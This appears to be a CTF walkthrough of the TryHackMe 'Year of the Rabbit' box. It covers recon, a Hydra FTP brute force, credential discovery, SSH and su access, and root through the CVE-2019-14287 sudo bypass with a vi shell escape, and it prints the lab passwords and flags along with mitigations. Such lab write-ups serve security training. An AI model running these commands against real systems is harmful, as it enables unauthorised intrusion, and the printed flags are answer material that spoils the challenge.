# Year of the Rabbit CTF Walkthrough

**Target:** Year of the Rabbit  
**Source:** [TryHackMe](https://tryhackme.com/room/yearoftherabbit)  
**Difficulty:** Easy  
**Target IP:** 10.112.168.116

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Web Enumeration](#web-enumeration)
- [Following the Breadcrumb Trail](#following-the-breadcrumb-trail)
- [Hidden Directory & Image Password List](#hidden-directory--image-password-list)
- [FTP Brute Force](#ftp-brute-force)
- [FTP: Eli's Brainfuck Creds](#ftp-elis-brainfuck-creds)
- [Initial Foothold via SSH (eli)](#initial-foothold-via-ssh-eli)
- [Lateral Movement to gwendoline](#lateral-movement-to-gwendoline)
- [User Flag](#user-flag)
- [Privilege Escalation](#privilege-escalation)
- [Root Flag](#root-flag)
- [Flags](#flags)
- [Vulnerabilities](#vulnerabilities)
- [Attack Chain Summary](#attack-chain-summary)
- [Tools Used](#tools-used)
- [References](#references)

---

## Overview

Year of the Rabbit is an easy Linux box built as a chain of breadcrumbs and
"rabbit holes." The objective is to capture the user and root flags. The path
runs through a CSS comment that points to a hidden PHP page, a JavaScript-based
redirect (bypassed with `curl`) that leaks a hidden directory, an image whose
embedded strings contain an FTP password list, an FTP brute force, a Brainfuck-
encoded credential file granting SSH access as `eli`, a hidden message exposing
`gwendoline`'s password, and finally a CVE-2019-14287 `sudo` bypass
(`-u#-1`) on a restricted `vi` rule to escalate to root.

**Key Skills Required:**
- Network scanning and service enumeration
- Web directory brute forcing and source-comment inspection
- Bypassing JavaScript redirects with `curl`
- Extracting embedded data from images (`strings`)
- FTP brute forcing (Hydra) with a custom wordlist
- Decoding Brainfuck
- Lateral movement via discovered credentials (`su`)
- Sudo privilege escalation via CVE-2019-14287 (`sudo -u#-1`) and `vi` shell escape

---

## Reconnaissance

### Network Scanning

A default scan shows three services:

```bash
nmap 10.112.168.116
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 21/tcp | ftp | vsftpd 3.0.2 |
| 22/tcp | ssh | OpenSSH |
| 80/tcp | http | Apache 2.4.10 (Debian) |

FTP, SSH, and a web server — the web app is the natural entry point.

---

## Web Enumeration

A directory brute force with PHP/TXT extensions surfaces an `assets` directory:

```bash
gobuster dir -u http://10.112.168.116/ \
  -w /usr/share/wordlists/dirb/common.txt -x .php,.txt -t 15
```

```
assets        (Status: 301) [--> /assets/]
index.html    (Status: 200)
```

`/assets/` contains a (troll) `RickRolled.mp4` and a `style.css`.

---

## Following the Breadcrumb Trail

The stylesheet hides a comment pointing to a secret PHP page:

```bash
curl http://10.112.168.116/assets/style.css
```

```
/* Nice to see someone checking the stylesheets.
   Take a look at the page: /sup3r_s3cr3t_fl4g.php */
```

Browsing `/sup3r_s3cr3t_fl4g.php` only shows a "turn off your JavaScript"
message — the page uses JS to redirect. Requesting it with `curl` (which ignores
JS) reveals the real redirect target and a hidden directory:

```bash
curl -i http://10.112.168.116/sup3r_s3cr3t_fl4g.php
```

```
HTTP/1.1 302 Found
Location: intermediary.php?hidden_directory=/WExYY2Cv-qU
```

> **Hidden directory:** `/WExYY2Cv-qU`

---

## Hidden Directory & Image Password List

The hidden directory holds a single image, `Hot_Babe.png`:

```bash
curl -O http://10.112.168.116/WExYY2Cv-qU/Hot_Babe.png
```

Dumping its strings reveals an FTP username and a long list of candidate
passwords appended to the file:

```bash
strings Hot_Babe.png > strings_hb.txt
cat strings_hb.txt
```

```
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
Mou+56n%QK8sr
1618B0AUshw1M
...
5iez1wGXKfPKQ
...
```

> **Recovered username:** `ftpuser` (password is one of ~80 candidates)

---

## FTP Brute Force

Save the candidate passwords to a list and brute force FTP with Hydra:

```bash
nano pass_list.txt        # paste the ~80 candidate passwords
hydra -l ftpuser -P pass_list.txt ftp://10.112.168.116
```

```
[21][ftp] host: 10.112.168.116   login: ftpuser   password: 5iez1wGXKfPKQ
```

> **Recovered credentials:** `ftpuser : 5iez1wGXKfPKQ`

---

## FTP: Eli's Brainfuck Creds

Logging into FTP exposes a single file, `Eli's_Creds.txt`:

```bash
ftp 10.112.168.116
Name: ftpuser
Password: 5iez1wGXKfPKQ

ftp> ls -la
-rw-r--r--    1 0  0  758 Jan 23  2020 Eli's_Creds.txt
ftp> get "Eli's_Creds.txt"
```

The file is Brainfuck source:

```bash
cat Eli\'s_Creds.txt
```

```
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ ...
```

Decoding it (e.g. via [copy.sh/brainfuck](https://copy.sh/brainfuck/)) yields:

```
User: eli
Password: DSpDiM1wAEwid
```

> **Recovered credentials:** `eli : DSpDiM1wAEwid`

---

## Initial Foothold via SSH (eli)

SSH in as `eli`. The login banner contains a story hint about a "leet s3cr3t
hiding place":

```bash
ssh eli@10.112.168.116
eli@10.112.168.116's password: DSpDiM1wAEwid
```

```
Message from Root to Gwendoline:
"Gwendoline, ... Check our leet s3cr3t hiding place. I've left you a hidden
message there"

eli@year-of-the-rabbit:~$ whoami
eli
```

> **Foothold:** `eli`

---

## Lateral Movement to gwendoline

Locate the "s3cr3t" hiding place referenced in the banner:

```bash
eli@year-of-the-rabbit:~$ locate s3cr3t
/usr/games/s3cr3t
/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
```

Reading the hidden file leaks Gwendoline's password:

```bash
eli@year-of-the-rabbit:~$ cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
```

```
Your password is awful, Gwendoline.
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!
   -Root
```

> **Recovered credentials:** `gwendoline : MniVCQVhQHUNI`

Switch users:

```bash
eli@year-of-the-rabbit:~$ su gwendoline
Password: MniVCQVhQHUNI
gwendoline@year-of-the-rabbit:~$ whoami
gwendoline
```

> **Foothold:** `gwendoline`

---

## User Flag

```bash
gwendoline@year-of-the-rabbit:~$ cat user.txt
THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
```

> **User flag:** `THM{1107174691af9ff3681d2b5bdb5740b1589bae53}`

---

## Privilege Escalation

Checking sudo rights reveals a rule that explicitly forbids running as `root`:

```bash
gwendoline@year-of-the-rabbit:~$ sudo -l
User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

The `(ALL, !root)` restriction is bypassable via **CVE-2019-14287**: passing the
user ID `-1` (or `4294967295`) to `sudo -u#` resolves to UID 0 (root) despite
the `!root` exclusion. Run the permitted `vi` as user `#-1`:

```bash
gwendoline@year-of-the-rabbit:~$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

Inside `vi`, escape to a root shell using the editor's command mode (per
[GTFOBins](https://gtfobins.org/gtfobins/vi/#sudo)):

```
:set shell=/bin/bash
:shell
```

```bash
root@year-of-the-rabbit:/home/gwendoline# whoami
root
```

> **Privilege escalation:** `gwendoline` → `root` via CVE-2019-14287 + `vi` escape

---

## Root Flag

```bash
root@year-of-the-rabbit:/root# cat root.txt
THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
```

> **Root flag:** `THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}`

---

## Flags

| Flag | Value | Location |
|------|-------|----------|
| User flag | `THM{1107174691af9ff3681d2b5bdb5740b1589bae53}` | `/home/gwendoline/user.txt` |
| Root flag | `THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}` | `/root/root.txt` |

---

## Vulnerabilities

### 1. Sensitive Hints in Web Source / Hidden Pages (Low)

**Description:** A CSS comment pointed to `/sup3r_s3cr3t_fl4g.php`, which in turn
leaked a hidden directory via an HTTP redirect that a JS check tried (and failed)
to hide.

**Impact:** Disclosure of the hidden directory holding the credential image.

**Mitigation:**
- Do not rely on client-side JavaScript for access control.
- Avoid leaving sensitive paths/hints in source comments.

### 2. Credentials Embedded in Image (High)

**Description:** An FTP username and password candidate list were appended to
`Hot_Babe.png`, recoverable with `strings`.

**Impact:** Enabled the FTP brute force and foothold.

**Mitigation:**
- Never embed credentials in served files.
- Treat all web-hosted assets as attacker-readable.

### 3. Weak / Brute-forceable FTP Password (High)

**Description:** `ftpuser`'s password was one of a small known list, trivially
brute-forced with Hydra.

**Impact:** FTP access and recovery of `eli`'s Brainfuck-encoded credentials.

**Mitigation:**
- Enforce strong, unique passwords and login rate limiting / lockout.

### 4. Plaintext / Weakly-Encoded Credentials on Disk (High)

**Description:** `eli`'s credentials were merely Brainfuck-encoded (not
encrypted) in an FTP file, and `gwendoline`'s password sat in a world-readable
hidden file under `/usr/games/s3cr3t`.

**Impact:** Foothold as `eli` and lateral movement to `gwendoline`.

**Mitigation:**
- Never store credentials in files; encoding is not protection.
- Restrict file permissions and use a secrets manager.

### 5. Sudo Bypass via CVE-2019-14287 (Critical)

**Description:** A `sudo` rule of `(ALL, !root) NOPASSWD: /usr/bin/vi ...` was
bypassed by `sudo -u#-1`, which resolves to UID 0 despite the `!root`
restriction; `vi` then provided a shell escape.

**Impact:** Full privilege escalation to `root`.

**Mitigation:**
- Patch sudo to ≥ 1.8.28 (fixes CVE-2019-14287).
- Avoid granting `sudo` on editors; they allow shell escapes.

---

## Attack Chain Summary

```
Nmap scan → 3 open ports (FTP, SSH, HTTP)
    ↓
gobuster → /assets → style.css comment → /sup3r_s3cr3t_fl4g.php
    ↓
curl (bypass JS) → 302 → hidden dir /WExYY2Cv-qU
    ↓
Hot_Babe.png → strings → ftpuser + password list
    ↓
hydra ftp → ftpuser : 5iez1wGXKfPKQ
    ↓
FTP → Eli's_Creds.txt (Brainfuck) → eli : DSpDiM1wAEwid
    ↓
ssh eli → banner hint → locate s3cr3t
    ↓
hidden message → gwendoline : MniVCQVhQHUNI
    ↓
su gwendoline → User flag: THM{1107174691af...}
    ↓
sudo -l → (ALL, !root) NOPASSWD: /usr/bin/vi
    ↓
sudo -u#-1 /usr/bin/vi (CVE-2019-14287) → :set shell=/bin/bash → :shell → root
    ↓
Root flag: THM{8d6f163a87a1...}
    ↓
Complete system compromise
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service detection |
| Gobuster | Web directory enumeration |
| cURL | Reading source, bypassing JS redirect, downloading the image |
| strings | Extracting embedded data from Hot_Babe.png |
| Hydra | Brute forcing the FTP password |
| Brainfuck interpreter (copy.sh) | Decoding eli's credentials |
| ftp / ssh / su | Foothold and lateral movement |
| sudo (CVE-2019-14287) + vi | Privilege escalation to root |

---

## References

- [TryHackMe — Year of the Rabbit](https://tryhackme.com/room/yearoftherabbit)
- [Nmap](https://nmap.org/)
- [Gobuster](https://github.com/OJ/gobuster)
- [THC Hydra](https://github.com/vanhauser-thc/thc-hydra)
- [CVE-2019-14287 — sudo security bypass](https://nvd.nist.gov/vuln/detail/CVE-2019-14287)
- [GTFOBins — vi](https://gtfobins.org/gtfobins/vi/#sudo)
- [Brainfuck interpreter](https://copy.sh/brainfuck/)

---
